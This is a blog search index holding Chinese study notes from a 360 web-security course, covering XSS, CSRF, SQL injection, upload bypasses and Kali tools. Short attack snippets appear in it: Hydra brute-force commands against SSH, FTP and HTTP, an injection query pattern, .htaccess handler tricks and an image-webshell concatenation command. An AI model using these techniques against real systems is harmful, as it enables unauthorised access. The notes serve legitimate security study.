<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Web安全原理与实践-360【2】</title>
    <link href="/2020/07/16/sec-360-2/"/>
    <url>/2020/07/16/sec-360-2/</url>
    
    <content type="html"><![CDATA[<p>本文内容为<a href="https://admin.college.360.cn/" target="_blank" rel="noopener">360网络安全大学</a>于2020年初举行的《Web安全原理与实践》系列课程的学习笔记。</p><h2 id="漏洞与实践"><a href="#漏洞与实践" class="headerlink" title="漏洞与实践"></a>漏洞与实践</h2><h3 id="四-命令执行漏洞"><a href="#四-命令执行漏洞" class="headerlink" title="四. 命令执行漏洞"></a>四. 命令执行漏洞</h3><h3 id="五-文件包含漏洞"><a href="#五-文件包含漏洞" class="headerlink" title="五. 文件包含漏洞"></a>五. 文件包含漏洞</h3><h3 id="六-Webshell与提权"><a href="#六-Webshell与提权" class="headerlink" title="六. Webshell与提权"></a>六. Webshell与提权</h3><h3 id="七-Web中间件"><a href="#七-Web中间件" class="headerlink" title="七. Web中间件"></a>七. Web中间件</h3><h2 id="企业防护"><a href="#企业防护" class="headerlink" title="企业防护"></a>企业防护</h2>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>课程笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web安全原理与实践-360【1】</title>
    <link href="/2020/07/08/sec-360/"/>
    <url>/2020/07/08/sec-360/</url>
    
    <content type="html"><![CDATA[<p>本文内容为<a href="https://admin.college.360.cn/" target="_blank" rel="noopener">360网络安全大学</a>于2020年初举行的《Web安全原理与实践》系列课程的学习笔记。</p><h2 id="导论"><a href="#导论" class="headerlink" title="导论"></a>导论</h2><h4 id="1-网络安全"><a href="#1-网络安全" class="headerlink" title="1.网络安全"></a>1.网络安全</h4><p><strong>网络安全</strong>是指网络系统中的硬件、软件及其系统中的数据受到保护，不因偶然的或恶意的原因而遭受破坏、篡改、泄露，系统连续可靠地运行，网络服务不中断。<strong>包括</strong>信息系统（主机、网络服务器）的安全、网络边界安全（WAF，防火墙等）及网络通信的安全。<strong>目标</strong>是网络系统中信息的<strong>机密性、完整性、可用性、不可抵赖性和可控性</strong>（五要素）等。</p><div align="center">  <img src="/2020/07/08/sec-360/cybersecurity.jpg" srcset="/img/loading.gif" width="50%" height="50%" alt="oauth"></div><p><strong>信息安全三要素（CIA）</strong>，机密性Confidentiality（保证信息不能被未授权地访问）、完整性Integrity（信息在生成、传输、存储、使用过程中不发生非授权篡改）、可用性Availability（授权用户根据需啊可以随时访问所需信息）。可控性是服务器等资源应该时刻在掌控之内；不可抵赖性即需要保存任何操作记录。</p><p><strong>网络安全事件分类</strong>如下图所示：</p><div align="center">  <img src="/2020/07/08/sec-360/cyber_cla.jpg" srcset="/img/loading.gif" width="100%" height="100%" alt="oauth"></div><p>网络安全事件列举：1）2014年1月21日，中国国内通用顶级域的根服务器忽然出现异常；2）OpenSSL心脏出血漏洞，2014年4月爆出Heartleed漏洞，读内存数据，涉及各大网银、门户网站等；3）数据泄露：12306、iCloud、Gmail、酒店、2017年暗网出现14亿邮箱密码；4）蠕虫病毒：2007年熊猫烧香；5）僵尸网络：DDOS攻击、勒索、发送垃圾邮件及网络钓鱼、挖矿等；6）无线安全：2017年12月2日连接星巴克WiFi，开始挖矿。</p><h4 id="2-信息安全法律法规"><a href="#2-信息安全法律法规" class="headerlink" title="2.信息安全法律法规"></a>2.信息安全法律法规</h4><p>《宪法》公民的通信自由和通信秘密受法律的保护。</p><p>《刑法》1）285条非法侵入计算机信息系统罪；2）286条破坏计算机信息系统罪；3）287条利用计算机实施犯罪的提示性规定。</p><p>《网络安全法》2017年6月1号起正式实施，主要包含五个方面内容：网络安全支持与促进、网络运行安全、<strong>关键信息基础设施</strong>的运行安全、网络信息安全、监测预警应急处置。规定<strong>网络安全等级保护制度</strong>，按照规定留存相关的网络日志不少于<strong>六个月</strong>。</p><h4 id="3-信息安全常识"><a href="#3-信息安全常识" class="headerlink" title="3.信息安全常识"></a>3.信息安全常识</h4><p>网络安全属于信息安全的一部分。网络安全主要是保证网络环境的持续、可靠、安全地运行。而信息安全主要包括：运行安全、人员安全、实体安全、计算机安全、通信安全和信息本身安全。</p><p>PC安全：安装防病毒软件、定期更新操作系统及软件、不随便安装来历不明的软件、关闭不必要的网络通信协议、定期备份数据。</p><p>密码安全：密码强度、低关联性、密码保护；弱口令。</p><p>邮件安全：勒索病毒、商业邮件诈骗、仿冒企业邮件。邮件别名、文档加密；</p><p>社会工程学安全：利用人的弱点获得信息、建筑物、系统和数据访问权限。畏惧权威、懒惰心理、害怕失去等</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="一-KALI渗透平台概述"><a href="#一-KALI渗透平台概述" class="headerlink" title="一. KALI渗透平台概述"></a>一. KALI渗透平台概述</h3><h4 id="1-虚拟机常识"><a href="#1-虚拟机常识" class="headerlink" title="1.虚拟机常识"></a>1.虚拟机常识</h4><p>网络模式：1）桥接模式：直接连接物理网络；2）NAT模式：用于共享主机的IP地址；3）仅主机模式：与主机共享的专用模式。</p><p>创建虚拟机的磁盘类型：1）新建一个虚拟磁盘，可以直接拷走（首选）；2）使用已经建立的虚拟磁盘；3）使用实际的磁盘，文件交换方便，但虚拟机操作系统受到损害后，会影响实际主机操作系统。</p><h4 id="2-Kali工具"><a href="#2-Kali工具" class="headerlink" title="2.Kali工具"></a>2.Kali工具</h4><p>Kali Top 10工具</p><div align="center">  <img src="/2020/07/08/sec-360/kail_top.jpg" srcset="/img/loading.gif" width="80%" height="80%" alt="oauth"></div><p>Kali工具分类（14类）：信息收集、无线攻击、密码破解、压力测试、取证工具、逆向工程、硬件攻防、漏洞挖掘、Web应用、漏洞利用工具、嗅探和欺骗、后门维持、情报分析。</p><p>Kali是一个综合性的平台，工具丰富，但比较适合入门级，学习理论部分。</p><h4 id="3-经典工具"><a href="#3-经典工具" class="headerlink" title="3. 经典工具"></a>3. 经典工具</h4><p>wafw00f，WAF识别工具，通过特征码识别的形式尝试识别服务器端部署的WAF，包括云WAF。</p><p>探测工具LBD，检测给定的域是否使用DNS或HTTP负载均衡。</p><p>Hydra（九头鸟）暴力破解工具，xhydra是图形化版本。</p><p>SETooklit，基于python语言开发的社会工程学工具包。</p><p>NMap的四项基本功能：主机发现、端口扫描、版本侦测和操作系统探测（OS-DB的系统指纹数据库）。Nmap基本参数配置，包括扫描类型、功能选项和扫描目标设定。Nmap脚本和NSE脚本，基于Lua语言，默认保存在/usr/share/nmap/scripts路径下。</p><p>Metaslpoit一款开源安全漏洞检测工具，一个强大的开源框架，继承了常见的溢出漏洞和流行的shellcode。可以在网上搜到大量教程进行学习。Meterpreter持久化访问方式。msf5使用别人的溢出攻击代码，利用漏洞。</p><h3 id="二-实验总结"><a href="#二-实验总结" class="headerlink" title="二. 实验总结"></a>二. 实验总结</h3><h4 id="1-Hydra暴力破解"><a href="#1-Hydra暴力破解" class="headerlink" title="1.Hydra暴力破解"></a>1.Hydra暴力破解</h4><p>Hydra支持常见的登录方式，比如SSH，FTP，HTTP，MYSQL，VNC等；而理论上只要有登录的地方，就可以进行暴力破解。</p><pre><code class="hljs bash"><span class="hljs-comment">#常见的用户名、密码文件已经下载好</span><span class="hljs-comment">#暴破HTTP</span>hydra -L user.txt -P passwd.txt x.x.x.x http-get<span class="hljs-comment">#暴破SSH</span>hydra -L user.txt -P passwd.txt x.x.x.x ssh<span class="hljs-comment">#暴破ftp </span>hydra -L user.txt -P passwd.txt x.x.x.x ftp</code></pre><h4 id="2-SET-钓鱼网站"><a href="#2-SET-钓鱼网站" class="headerlink" title="2.SET-钓鱼网站"></a>2.SET-钓鱼网站</h4><p>SET是开源的社会工程学套件，支持鱼叉式网络钓鱼攻击、网页攻击、传染媒介式（木马）、建立payload和listener、邮件群发攻击、Arduino基础攻击、无线接入点攻击、二维码攻击和Powershell攻击等常见攻击场景。使用的攻击方法有Java Applet攻击方法、Metasploit浏览器利用方法、Tabnabbing攻击方法、Web顶击攻击方法、多重攻击Web方法、全屏幕攻击方法和HTA攻击方法等。</p><pre><code class="hljs bash"><span class="hljs-comment">#root用户开启SET工具</span>setoolkit<span class="hljs-comment">#根据界面中的提示完成选择，工具可以自动生成，比如仿照google的登录界面，获得界面上的输入。</span></code></pre><h4 id="3-Nmap扫描与RDP连接"><a href="#3-Nmap扫描与RDP连接" class="headerlink" title="3.Nmap扫描与RDP连接"></a>3.Nmap扫描与RDP连接</h4><p>网络扫描的目的即利用各种工具对目标的IP地址或地址段的主机查找漏洞。对于系统管理者而言，可以额通过扫描技术，了解网络的安全配置和正在运行的应用服务，即使发现可能存在的漏洞和错误配置，客观评估风险等级。一个完整的网络安全扫描过程通常分为三个阶段：1）发现目标主机或网络；2）搜集目标信息，比如主机运行的操作系统类型，服务，服务软件的版本等，网络拓扑结构、路由设备及主机信息。</p><p>使用nmap -O【IP地址】，扫描某主机上开放的端口，利用此端口实现rdesktop远程桌面连接。</p><h4 id="4-Burpsuite工具与MIME上传检测绕过"><a href="#4-Burpsuite工具与MIME上传检测绕过" class="headerlink" title="4. Burpsuite工具与MIME上传检测绕过"></a>4. Burpsuite工具与MIME上传检测绕过</h4><p>服务器端上传检测文件时，在HTTP中MIME类型被定义在Content-Type header中。利用Burpsuite代理抓包后修改相关数据包信息（修改上传文件后缀名，同时修改Content-Type字段）绕过MIME检测。实验涉及Burpsuite的基本操作，如与浏览器关联、抓包改包等。</p><h4 id="5-Burpsuite暴力破解"><a href="#5-Burpsuite暴力破解" class="headerlink" title="5.Burpsuite暴力破解"></a>5.Burpsuite暴力破解</h4><p>Intruder功能包括如利用漏洞、Web应用程序模糊测试，进行暴力猜解等。Intruder主要有四个模块：Target选项，用于配置目标服务器的详细信息；Positions，设置Payloads的插入点以及攻击类型；Opetions选项，包含request headers、request engine、attack results、grep match、grep extract、grep payloads和redirections。</p><h2 id="漏洞与实践"><a href="#漏洞与实践" class="headerlink" title="漏洞与实践"></a>漏洞与实践</h2><h3 id="一-XSS漏洞"><a href="#一-XSS漏洞" class="headerlink" title="一. XSS漏洞"></a>一. XSS漏洞</h3><p>跨站脚本（XSS， Cross-Site Scripting），由于Web应用程序对用户的输入过滤不足，攻击者利用漏洞把恶意的脚本代码（HTML代码/JS脚本）注入到网页中。<strong>其他用户</strong>浏览网页时，会执行其中的恶意代码。XSS主要用于对用户Cookie资料窃取、会话劫持、钓鱼欺骗等。</p><div align="center">  <img src="/2020/07/08/sec-360/xss.jpg" srcset="/img/loading.gif" width="60%" height="60%" alt="oauth"></div><p>常见XSS分为以下三类：反射型XSS</p><h4 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="1.反射型XSS"></a>1.反射型XSS</h4><p>反射型XSS，也称为非持久性XSS，参数型XSS，主要用于将恶意脚本附加到URL地址的参数中。</p><div align="center">  <img src="/2020/07/08/sec-360/fxss.jpg" srcset="/img/loading.gif" width="60%" height="60%" alt="oauth"></div><p>一般会使用编码迷惑受害者，或绕过过滤语句。熟悉以下编码形式：URL编码、HTML实体化编码等。</p><h4 id="2-持久型XSS"><a href="#2-持久型XSS" class="headerlink" title="2.持久型XSS"></a>2.持久型XSS</h4><p>持久型XSS，也即存储型XSS，不需要用户单击特定URL就可以执行。攻击者事先将恶意JS代码上传或存储到漏洞服务器中，当受害者浏览包含此恶意JS代码的页面就会执行恶意代码。网站中存在表单的地方常见此类XSS。</p><div align="center">  <img src="/2020/07/08/sec-360/cxss.jpg" srcset="/img/loading.gif" width="40%" height="40%" alt="oauth"></div><h4 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="3.DOM型XSS"></a>3.DOM型XSS</h4><p>DOM即Domcument object mode，文档对象模型，HTML DOM中一般定义对象属性以及执行方法。DOM会将XML节点构建成树状结构，以此反映XML文件本身的阶层结构。DOM中有多种类型节点，包括1）元素节点；2）文本节点和3）属性节点。</p><p>DOM型XSS与其它两类XSS的区别主要在于，“程序执行不依赖于服务器端的数据，从客户端获得DOM中的数据并在本地执行”（通过DOM对象执行其中的元素）。</p><h4 id="4-XSS常见语句与编码绕过"><a href="#4-XSS常见语句与编码绕过" class="headerlink" title="4.XSS常见语句与编码绕过"></a>4.XSS常见语句与编码绕过</h4><p>常见XSS标签为&lt;script&gt;,&lt;img&gt;，&lt;input&gt;标签下的触发alert语句。</p><p>绕过的常用操作有，闭合标签，大小写绕过，双写关键字；目前有很多浏览器对引号做了过滤，我们可以用反撇号绕过。</p><p>HTML实体编码，例如实体编码（双引号&amp;quot）；ASC编码（&amp;#34）；十六进制编码；Base64（一种用64个字符表示的编码方式，包括a-z，A-Z，0-9，+，/）来表示任意二进制数据。</p><h3 id="二-CSRF漏洞"><a href="#二-CSRF漏洞" class="headerlink" title="二. CSRF漏洞"></a>二. CSRF漏洞</h3><h4 id="1-浏览器同源策略"><a href="#1-浏览器同源策略" class="headerlink" title="1.浏览器同源策略"></a>1.浏览器同源策略</h4><p>1995年由Netscape公司引入浏览器，即A网页设置的Cookie，B网页不能打开，除非这两个网页“同源”。同源的意思是：1）协议相同；2）域名相同；3）端口相同。这个策略的目的是为了保证用户信息安全，防止恶意网站窃取数据。同源策略有三种限制范围：1）Cookie、LocalStorage和IndexDB无法读取；2）Dom无法获取；3）AJAX请求不能发送。</p><p>HTTP是无状态连接，Cookie保存在客户端浏览器，只要会话没有被注销，都可以访问。</p><p><strong>Cookie作用域</strong>，其中包括两个重要属性：Domain和Path。</p><h4 id="2-CSRF跨站请求伪造"><a href="#2-CSRF跨站请求伪造" class="headerlink" title="2.CSRF跨站请求伪造"></a>2.CSRF跨站请求伪造</h4><p>Cross-site request forgery，黑客利用已经登录的用户，诱使其访问或登录某个早已构造号的恶意连接或页面，然后在用户毫不知情的情况下，以用户的名义完成非用户本意的非法操作。也被称为One Click Attack或Session Riding，写为CSRF或XSRF。这种攻击相比于XSS更为小众而且难以防范，属于“借刀杀人”。</p><p>session是保存在服务端，然后下发到客户端由cookie携带，cookie直接在客户端。</p><p>一个CSRF漏洞攻击的实现需要三部分组成：1）一个漏洞（无需验证、任意修改后台数据、新增请求等）；2）伪装数据操作请求的恶意链接或页面；3）诱使用户（在cookie还有效的时候）主动访问或登录恶意链接，触发非法操作。</p><h4 id="3-CSRF的防御"><a href="#3-CSRF的防御" class="headerlink" title="3.CSRF的防御"></a>3.CSRF的防御</h4><p>基于token随机值的CSRF防御，使用这种方法本身是可以防御掉CSRF的，但在有XSS漏洞的情况下可以绕过。</p><p>终极防御可以彻底防御掉CSRF漏洞，比如除了CSRF token防御外，还加入当前的账号密码验证。另外不同等级的csrf token的构造方法的安全程度也不同，有直接递增的，有使用时间戳加随机函数构造的，还有使用sha1加密的。</p><p>课程中使用<strong>DVMA平台</strong>完成实验。</p><h3 id="二-SQL注入"><a href="#二-SQL注入" class="headerlink" title="二. SQL注入"></a>二. SQL注入</h3><h4 id="1-数据库基础"><a href="#1-数据库基础" class="headerlink" title="1.数据库基础"></a>1.数据库基础</h4><p>数据库可以大致分为关系型数据库（如MySQL，Oracle，Access等）和非关系型数据库（Not only SQL，比如Redis，mongoDB等）。</p><p>关系型数据库遵循<strong>ACID理论</strong>：1）原子性（Atomicity）：事件为一个不可分割的单位，事务中的操作要么都发生，要么都不发生；2）一致性（Consistency）：事务前后数据的完整性必须保持一致；3）隔离性（Isolation）：多个用户并发访问数据库时，数据库为每个用户开启事务，多个并发事务之间相互隔离，数据不干扰；4）持久型（Durability）：一个事物一旦被提交，它对数据库的改变是永久性的，接下来的任何数据库发生故障也不会有影响。</p><p>数据库访问接口：</p><ul><li><strong>开放数据库连接ODBC</strong>：为了解决异构数据库间的数据共享，为数据库访问提供统一接口，允许应用程序一SQL为数据存取标准，存取不同DBMS管理的数据。使用ODBC可以访问各类计算机上的DB文件，甚至访问如Excel表和ASCII数据文件这类非数据库对象。<strong>ODBC提供了一个公共数据访问层，可以用来访问几乎所有的关系型数据库</strong>。</li><li><strong>数据访问对象DAO</strong>：允许Visual Basic开发者通过ODBC像直接连接到其它数据库一样。连接Access表。如果数据库时Access数据库且在本地使用，建议用这种方式。</li><li><strong>远程数据对象RDO</strong>：一个到ODBCDE、面向对象的数据访问接口，同DAO结合提供一个接口，展示出ODBC的底层功能和灵活性。</li><li><strong>对象连接与嵌入数据库OLE DB</strong>: 具有面向其它非SQL数据类型的通路（ODBC是为了访问关系型数据库而专门开发的）。</li><li><strong>活动数据对象（ADO)</strong>：最新的数据库访问模式，具有简单易用的特点，目前已是数据库开发的主流。</li></ul><div align="center">  <img src="/2020/07/08/sec-360/dbd.jpg" srcset="/img/loading.gif" width="40%" height="40%" alt="oauth"></div><p><strong>识别数据库</strong>，可以使用盲跟踪（根据Web应用技术、不同数据库SQL语句差异）或非盲跟踪（报错、直接查询）方法。具体来讲：1）不同的数据库会有不同的默认端口号；2）在报错信息里可以看到数据库关键字；3）各数据库的版本查询方法区别，不同版本号对应的漏洞基本上是固定的；4）各数据库在字符串处理时会有区别，比如如何获取字符串长度，截取字符串等；5）各数据库与网页编程语言的搭配也比较固定。</p><h4 id="2-SQL语法基础"><a href="#2-SQL语法基础" class="headerlink" title="2.SQL语法基础"></a>2.SQL语法基础</h4><p>order by，排序，可以利用这个语句判断某个表的字段数。</p><p>limit，过滤打印结果的数据，参数包括偏移量和数目。</p><p>group by，按组处理，一般需要与select后面的条件函数共同使用。</p><p>union，联合查询，可以结合系统函数暴露数据库信息；比如MySQL 5.5以上版本包括information_schema数据库，保存着所维护的所有其他数据库的信息，union select集合load file（）可以读取服务器文件内容。</p><h4 id="3-SQL注入漏洞利用"><a href="#3-SQL注入漏洞利用" class="headerlink" title="3.SQL注入漏洞利用"></a>3.SQL注入漏洞利用</h4><p>SQL注入是攻击者利用Web应用程序对用户输入验证上的疏忽，在输入的输入数据中包含某些数据库系统有特殊意义的符号，直接把用户输入的数据拼接为SQL语句执行，从而影响数据库安全和平台安全。实现此类攻击有两个条件:1）用户可以控制输入；2）原本程序要执行SQL语句，拼接了用户的恶意语句。</p><p>SQL注入带来的常见危害为：1）绕过登录验证，比如使用<strong>万能密码</strong>登录网站后台；2）获取敏感数据；3）文件系统操作；4）注册表操作；5）执行系统命令。</p><p>常用的SQL注入方式：1）经典的恒为真的逻辑表达式；2）数据库函数，如sleep使数据库休眠；3）特殊符号，如单引号，双引号。</p><p>防护策略：严格限制数据库的操作权限，尽量给出能满足所有操作的最低权限，在Web层可以过滤用户的输入来防止SQL注入比如用Filter过滤全局表单参数，或者使用WAF系统进行专业防护。</p><h5 id="1-gt-SQL注入分类"><a href="#1-gt-SQL注入分类" class="headerlink" title="1&gt; SQL注入分类"></a>1&gt; SQL注入分类</h5><p>首先依照<strong>注入点类型</strong>可以分为1）数字型；2）字符型；3）搜索型；其中搜索型的SQL语句原型为：</p><pre><code class="hljs sql"><span class="hljs-comment">#原形式</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 字段 <span class="hljs-keyword">like</span> <span class="hljs-string">'%关键字%'</span><span class="hljs-comment">#攻击形式</span><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> 表名 <span class="hljs-keyword">where</span> 字段 <span class="hljs-keyword">like</span> <span class="hljs-string">'%'</span> <span class="hljs-keyword">and</span> [查询条件] <span class="hljs-keyword">and</span> <span class="hljs-string">'%'</span>=<span class="hljs-string">'%'</span></code></pre><p>按<strong>注入技术</strong>分类，可分为1）基于布尔的盲注；2）基于时间的盲注；3）基于报错的注入；4）联合查询注入和堆查询注入。</p><p>按SQL注入<strong>漏洞形成原因</strong>分类，可分为1）动态字符串构建引起，如转义字符、报错信息、联合查询、多次提交等；2）后台存在问题，如后台无用户数据编码或过滤，或可以直接拼接用户传递的代码；3）错误处理不当，将详细的内部报错信息返回给用户；4）不安全的数据库配置，比如默认账户（SQL server的sa账户，MySQL的root和anonymous账户）、权限问题。</p><h5 id="2-gt-SQL注入过程"><a href="#2-gt-SQL注入过程" class="headerlink" title="2&gt; SQL注入过程"></a>2&gt; SQL注入过程</h5><p>手工注入过程：1）是否存在注入点；2）字段长度；3）字段回显位置；4）数据库信息；5）数据库名；6）数据库表；7）数据库表中所有字段以及字段值；8）猜解账号密码；9）登录管理员后台。</p><h4 id="4-SQL盲注"><a href="#4-SQL盲注" class="headerlink" title="4. SQL盲注"></a>4. SQL盲注</h4><p>重点是找到注入点并明确注入类型。SQL盲注即，当数据库运行返回结果<strong>只反馈对错</strong>而不返回信息时，采用<strong>逻辑判断</strong>是否正确的盲注来获取信息。盲注可以分为三类：布尔盲注、时间盲注和报错型盲注。</p><p>盲注一般使用<strong>二分法</strong>。使用最多的是条件语句。时间盲注最相关的是sleep(time)函数和BENCHMARK(count, expr)函数。</p><p><strong>HTTP文件头注入</strong>（拓展）</p><p>常见HTTP请求头有：1）Host, 指定被请求资源的地址和端口号；2）User-Agent，客户端的操作系统、浏览器和其它属性；3）Referer，上一个访问的URL，即用户从哪里跳转到这个页面的；4）Cookie，一段文本代表请求者的身份；5）Range，请求实体的部分内容，多线程下载一定会用到；6）X-Forwarded-For，XXF头，代表请求端的IP，可以有多个；7）Accept，指定客户端接收那些MIME类型的信息；8）Accept-Charset，指定客户端接收的字符集。</p><p>据此可以分为Cookie注入、Referer注入、UA注入、XFF头注入等。<strong>webbug3.0平台</strong>可以进行练习。</p><h4 id="5-实验"><a href="#5-实验" class="headerlink" title="5.实验"></a>5.实验</h4><p>网站推荐：SQL Injection sqli 和 DVWA以及CMS论坛网站。</p><h5 id="1-gt-SQLMap工具简介"><a href="#1-gt-SQLMap工具简介" class="headerlink" title="1&gt;SQLMap工具简介"></a>1&gt;SQLMap工具简介</h5><p>一款开源的自动化SQL注入工具，主要功能是扫描、发现并利用给定的URL的SQL注入漏洞。针对某个URL可以判断可注入的参数，判断可以用哪种SQL注入技术，识别出后台数据库类型，根据用户选择，读取一些数据。SQLMap主要支持针对关系型数据库的注入。</p><p>SQLMap检测之<strong>前置发包</strong>，会检测网站连通性、WAF探测（使用响应相似度技术、时间延迟等因素，判断目标网站是否受WAF保护）、网页稳定性检测、参数动态性检测、启发式注入检测和误报检测。</p><p><strong>响应相似度对比技术</strong>，即sqlmap在前置发包过程里，将网站连通性测试中的响应定义为原始响应（包括状态码、HTTP响应头、HTTP响应体）。原始响应会作为对比过程中被对比的对象，一个请求响应后，与原始响应对比，得出结果。</p><h5 id="2-gt-SQLMap参数"><a href="#2-gt-SQLMap参数" class="headerlink" title="2&gt; SQLMap参数"></a>2&gt; SQLMap参数</h5><p>获取目标方式：1）-u，直接输入目标URL；2）-m，读取文件中的URL；3）-r 从文本文件中获取HTTP请求；4）-g，测试注入Google的搜索结果的GET参数；5）-l，从Burp或WebScarab代理中获取日志。</p><p><em>使用演示：- -dbs, 查看当中的数据库名称；3）-D，指定数据库；4）- - tables, 打印数据库表名；5）- - dump，打印内容。</em></p><p>请求目标的方式：1）- - method，指定使用的http方法（GET POST等）；2）- - data，把数据以POST方式提交；3）- - param-del，GET或POST的数据用&amp;以外的其它字符分割；4）- - cookie，- - load-cookies，- - drop-set-cookie等一些头部参数（出现网站重定向提示后可以加入cookie）；5）- - flush-session，将之前扫描过的缓存清除掉。</p><p>注入测试相关参数：1）- - level，- - risk，为探测等级和风险等级；2）-p， - - skip，前者手动设置想要测试的参数，后者设置跳过的参数。</p><p>注入技术参数：1）- - technique，指定探测技术等</p><p>探测是否有WAF：1）- -check-waf；2）tamper目录中是waf绕过脚本，比如url编码转换，字符串unicode编码绕过，改写特殊字符语句等。</p><h5 id="3-gt-SQL盲注"><a href="#3-gt-SQL盲注" class="headerlink" title="3&gt; SQL盲注"></a>3&gt; SQL盲注</h5><p>SQLI平台上的lesson5（布尔盲注），lesson8（报错盲注），lesson9（时间盲注）</p><h3 id="三-上传漏洞"><a href="#三-上传漏洞" class="headerlink" title="三. 上传漏洞"></a>三. 上传漏洞</h3><h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h4><p>文件上传<strong>表单属性enctype</strong>有三个可选值，application/x-www-form-urlencoded，multipart/form-data和text/plain（表单以出文本形式编码）。</p><p>上传文件时没有对上传的文件进行严格地过滤，或程序开发部署时没有考虑系统特性，或者攻击者通过Web服务器解析漏洞绕过限制，导致可以上传任意文件。此类攻击实现的条件有：1）Web服务器开放上传功能；2）Web用户对目标目录有可执行权限；3）Web容器可以解析上传的脚本。造成危害包括：1）上传任意文件；2）获取执行权限，直接上传后门文件，导致网站沦陷；3）通过其他漏洞进行提权操作，拿到系统管理权限，导致服务器沦陷。</p><p><strong>小马</strong>，即一句话木马，代码量较小，功能强大，是为了绕过WAF检测。木马的函数执行了我们发送的命令，即使用GET, POST, Cookie相关函数接收数据，并传递给一句话木马中的执行命令的函数。</p><p><strong>大马</strong>，功能丰富，代码量大，功能基本相同，每个团队都有自己的定制大马。</p><h4 id="2-检测与绕过"><a href="#2-检测与绕过" class="headerlink" title="2. 检测与绕过"></a>2. 检测与绕过</h4><h5 id="1-gt-客户端检测与绕过"><a href="#1-gt-客户端检测与绕过" class="headerlink" title="1&gt; 客户端检测与绕过"></a>1&gt; 客户端检测与绕过</h5><p>通过JS代码实现，也称为JS检测与绕过。</p><p>一种方法是直接在浏览器上修改代码，不要调用相关判断函数；第二种方法是使用Burp Suite代理，请求通过前端验证后，由BP抓包后更改发送至后端。</p><h5 id="2-gt-服务端检测与绕过"><a href="#2-gt-服务端检测与绕过" class="headerlink" title="2&gt; 服务端检测与绕过"></a>2&gt; 服务端检测与绕过</h5><p>对于文件上传，只从Web前端进行检测显然防护不足，一般服务器检测包括以下几个方面：</p><ul><li><strong>后缀名</strong>；大小写绕过黑名单过滤；名单列表绕过（某些中间件允许解析其它后缀名，比如php3，phtml等）；Windows特性（比如自动清除末尾的点和空格，多文件流::$DATA）；白名单的绕过需要配合文件包含漏洞和解析漏洞；.htaccess文件攻击（文件中写入 SetHandler application/x-httpd-php 或 SetHandler application/x-httpd-php .jpg 即前者是无论文件类型是什么，只要符合PHP语法，都可以按照PHP运行；也可以使用AddHandler php5-script .php，只要文件名中包含php就按照PHP执行）；利用Apache解析漏洞（Apache从右向左解析后缀名，无法解析则跳过）；</li><li><strong>MIME类型</strong>：MIME是描述消息内容类型的因特网标准，如application/x-javascript，text/html等。在HTTP协议中，使用Content-Type字段表示，而后端也是从这个字段里获取。</li><li><strong>文件内容</strong>：使用getimagesize（）函数获取图片文件的大小参数；其中包括文件幻数检测，即文件头是否是图片的文件头。我们可以直接伪造文件头，在脚本文件的开头补充图片文件头值；或者在图片后面直接写脚本代码（copy 1.jpg/b+1.php/a 2.jpg），但<strong>图片马</strong>上传后需要结合其他漏洞使用。</li><li><strong>00截断</strong>：核心在于出现char(0)，程序中出现这个变量时，会误当作结束符，其后面的数据会被停止。这种方法需要php版本小于5.3.4，magic_quotes_gpc为OFF状态。有GET和POST两种方式。</li><li><strong>条件竞争</strong>：某些网站允许上传任意文件，之后会检查文件是否有可执行脚本，有则删除。但我们可以在上传的脚本中实现生成新文件的功能，即使上传文件被删除后，依然有可以运行的脚本。</li></ul><h4 id="3-Web容器漏洞"><a href="#3-Web容器漏洞" class="headerlink" title="3.Web容器漏洞"></a>3.Web容器漏洞</h4><p>Web容器是一种服务程序，处理从客户端发出的请求，一个服务器可以有多个容器。常见Web容器漏洞这部分学习中用到的是IIS, Apache，Nginx，Tomcat，Jboss，Web Logic等。</p><h5 id="1-gt-Apache解析漏洞"><a href="#1-gt-Apache解析漏洞" class="headerlink" title="1&gt; Apache解析漏洞"></a>1&gt; Apache解析漏洞</h5><p>Apache解析漏洞与用户的配置有密切关系。Apache和php有三种结合方式，包括CGI，FastCGI和Module（使用最多，把php编译为apache的模块）。</p><p>Apache默认一个文件可以由多个以点分割的后缀，当右边的后缀无法识别，则继续向左识别。其实Apache这个特性<strong>本身没有问题</strong>，因为即使将这类文件识别为PHP文件，PHP引擎也无法处理其他后缀名。问题是处在开发人员为了方便自身工作，而给Apache做了有漏洞的配置，比如：</p><pre><code class="hljs bash"><span class="hljs-comment">#在conf中添加</span>AddHandler application/x-http-php .php<span class="hljs-comment">#规避方法，改用正则和SetHandler</span>&lt;FilesMatch <span class="hljs-string">".+\.php$"</span>&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;&lt;FilesMatch <span class="hljs-string">".+\.ph(p[3457]?|t|tml)\."</span>&gt;Require all denied&lt;/FilesMatch&gt;</code></pre><p><strong>/etc/mime.types文件</strong>中记录了Apache可识别的文件类型，当客户端请求一个文件时，如果后缀在这个列表里，那么apache就返回对应的content-type给浏览器，否则直接给文件内容，由浏览器自行处理。</p><p><strong>/etc/apache2/mods-enables/php7.2.conf文件</strong>中包含正则匹配，如果请求的文件名符合则把文件交给PHP引擎处理。</p><h5 id="2-gt-IIS解析漏洞"><a href="#2-gt-IIS解析漏洞" class="headerlink" title="2&gt; IIS解析漏洞"></a>2&gt; IIS解析漏洞</h5><p>IIS6.0文件解析漏洞</p><h5 id="3-gt-Nginx解析漏洞"><a href="#3-gt-Nginx解析漏洞" class="headerlink" title="3&gt; Nginx解析漏洞"></a>3&gt; Nginx解析漏洞</h5>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>课程笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Web安全攻防实战[1]-极客时间</title>
    <link href="/2020/07/08/sec-geek/"/>
    <url>/2020/07/08/sec-geek/</url>
    
